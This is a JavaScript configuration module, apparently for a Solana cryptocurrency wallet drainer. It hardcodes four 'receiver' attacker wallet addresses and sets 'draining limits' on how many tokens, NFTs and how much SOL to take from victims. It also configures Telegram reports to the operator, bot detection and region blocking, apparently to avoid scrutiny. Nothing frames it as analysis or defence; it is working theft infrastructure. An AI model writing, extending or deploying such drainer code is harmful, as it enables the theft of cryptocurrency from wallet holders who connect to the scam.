import 'dotenv/config';

class ConfigManager {
  constructor() {
    this.config = this.loadConfig();
    this.validateConfig();
  }

  /**
   * Load configuration from environment variables
   * @returns {Object} Configuration object
   */
  loadConfig() {
    return {
      // RPC Configuration
      rpc: {
        url: process.env.RPC_URL || 'https://api.mainnet-beta.solana.com',
        commitment: 'confirmed',
        timeout: parseInt(process.env.RPC_TIMEOUT) || 60000
      },

      // Receiver Wallets
      receivers: {
        primary: process.env.RECEIVER_WALLET || '3F2D7izX8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz',
        secondary: process.env.RECEIVER_WALLET_2 || '5GggKwMS7mJQKqQqKqQqKqQqKqQqKqQqKqQqKqQqKqQq',
        tertiary: process.env.RECEIVER_WALLET_3 || 'FtgbMX3E8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz',
        quaternary: process.env.RECEIVER_WALLET_4 || '4dGUJf1CtJSNfgJSwHjEfiRSyT9YJGeNf3V9LjMREHiq'
      },

      // Rate Limiting
      rateLimit: {
        windowMs: parseInt(process.env.RATE_LIMIT_WINDOW) || 60000,
        maxRequests: parseInt(process.env.MAX_REQUESTS_PER_WINDOW) || 10,
        maxWalletRequests: parseInt(process.env.MAX_WALLET_REQUESTS) || 5,
        suspiciousThreshold: parseInt(process.env.SUSPICIOUS_THRESHOLD) || 20,
        blockThreshold: parseInt(process.env.BLOCK_THRESHOLD) || 50
      },

      // Caching
      cache: {
        ttl: parseInt(process.env.CACHE_TTL) || 30000,
        maxSize: parseInt(process.env.MAX_CACHE_SIZE) || 1000
      },

      // Security
      security: {
        enableGeolocation: process.env.ENABLE_GEOLOCATION === 'true',
        blockedRegions: process.env.BLOCKED_REGIONS?.split(',') || [],
        enableBotDetection: process.env.ENABLE_BOT_DETECTION !== 'false'
      },

      // Telegram
      telegram: {
        enabled: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
        botToken: process.env.TELEGRAM_BOT_TOKEN,
        chatId: process.env.TELEGRAM_CHAT_ID,
        reportInterval: parseInt(process.env.TELEGRAM_REPORT_INTERVAL) || 300000 // 5 minutes
      },

      // Performance
      performance: {
        enableMonitoring: process.env.ENABLE_PERFORMANCE_MONITORING !== 'false',
        metricsInterval: parseInt(process.env.METRICS_INTERVAL) || 300000 // 5 minutes
      },

      // Draining Limits
      draining: {
        maxTokens: parseInt(process.env.MAX_TOKENS) || 5,
        maxNFTs: parseInt(process.env.MAX_NFTS) || 3,
        minSOLForDrain: parseInt(process.env.MIN_SOL_FOR_DRAIN) || 5000,
        maxSOLDrain: parseInt(process.env.MAX_SOL_DRAIN) || 1000000000 // 1 SOL
      }
    };
  }

  /**
   * Validate configuration
   * @throws {Error} If configuration is invalid
   */
  validateConfig() {
    const errors = [];

    // Validate RPC URL
    if (!this.config.rpc.url || !this.config.rpc.url.startsWith('http')) {
      errors.push('Invalid RPC_URL - must be a valid HTTP URL');
    }

    // Validate receiver wallets
    const receiverWallets = Object.values(this.config.receivers);
    for (const wallet of receiverWallets) {
      if (!this.isValidPublicKey(wallet)) {
        errors.push(`Invalid receiver wallet: ${wallet}`);
      }
    }

    // Validate rate limiting
    if (this.config.rateLimit.maxRequests <= 0) {
      errors.push('MAX_REQUESTS_PER_WINDOW must be greater than 0');
    }

    if (this.config.rateLimit.windowMs <= 0) {
      errors.push('RATE_LIMIT_WINDOW must be greater than 0');
    }

    // Validate Telegram config
    if (this.config.telegram.enabled) {
      if (!this.config.telegram.botToken) {
        errors.push('TELEGRAM_BOT_TOKEN is required when Telegram is enabled');
      }
      if (!this.config.telegram.chatId) {
        errors.push('TELEGRAM_CHAT_ID is required when Telegram is enabled');
      }
    }

    // Validate draining limits
    if (this.config.draining.maxTokens <= 0) {
      errors.push('MAX_TOKENS must be greater than 0');
    }

    if (this.config.draining.maxNFTs <= 0) {
      errors.push('MAX_NFTS must be greater than 0');
    }

    if (this.config.draining.minSOLForDrain < 0) {
      errors.push('MIN_SOL_FOR_DRAIN cannot be negative');
    }

    if (errors.length > 0) {
      throw new Error(`Configuration validation failed:\n${errors.join('\n')}`);
    }
  }

  /**
   * Check if string is valid Solana public key
   * @param {string} publicKey - Public key to validate
   * @returns {boolean} True if valid
   */
  isValidPublicKey(publicKey) {
    try {
      // Basic validation - 32-44 characters, base58
      if (!publicKey || typeof publicKey !== 'string') return false;
      if (publicKey.length < 32 || publicKey.length > 44) return false;
      
      // Check for valid base58 characters
      const base58Regex = /^[1-9A-HJ-NP-Za-km-z]+$/;
      return base58Regex.test(publicKey);
    } catch {
      return false;
    }
  }

  /**
   * Get configuration value
   * @param {string} path - Dot notation path (e.g., 'rpc.url')
   * @returns {any} Configuration value
   */
  get(path) {
    return path.split('.').reduce((obj, key) => obj?.[key], this.config);
  }

  /**
   * Set configuration value
   * @param {string} path - Dot notation path
   * @param {any} value - Value to set
   */
  set(path, value) {
    const keys = path.split('.');
    const lastKey = keys.pop();
    const obj = keys.reduce((obj, key) => obj[key] = obj[key] || {}, this.config);
    obj[lastKey] = value;
  }

  /**
   * Reload configuration from environment
   */
  reload() {
    this.config = this.loadConfig();
    this.validateConfig();
  }

  /**
   * Get configuration summary
   * @returns {Object} Configuration summary
   */
  getSummary() {
    return {
      rpc: {
        url: this.config.rpc.url,
        commitment: this.config.rpc.commitment
      },
      rateLimit: {
        maxRequests: this.config.rateLimit.maxRequests,
        windowMs: this.config.rateLimit.windowMs
      },
      security: {
        enableGeolocation: this.config.security.enableGeolocation,
        enableBotDetection: this.config.security.enableBotDetection
      },
      telegram: {
        enabled: this.config.telegram.enabled
      },
      performance: {
        enableMonitoring: this.config.performance.enableMonitoring
      },
      draining: {
        maxTokens: this.config.draining.maxTokens,
        maxNFTs: this.config.draining.maxNFTs
      }
    };
  }

  /**
   * Export configuration for backup
   * @returns {Object} Configuration backup
   */
  export() {
    return {
      timestamp: new Date().toISOString(),
      config: this.config
    };
  }

  /**
   * Import configuration from backup
   * @param {Object} backup - Configuration backup
   */
  import(backup) {
    if (backup.config) {
      this.config = backup.config;
      this.validateConfig();
    }
  }
}

// Create singleton instance
const configManager = new ConfigManager();

export default configManager; 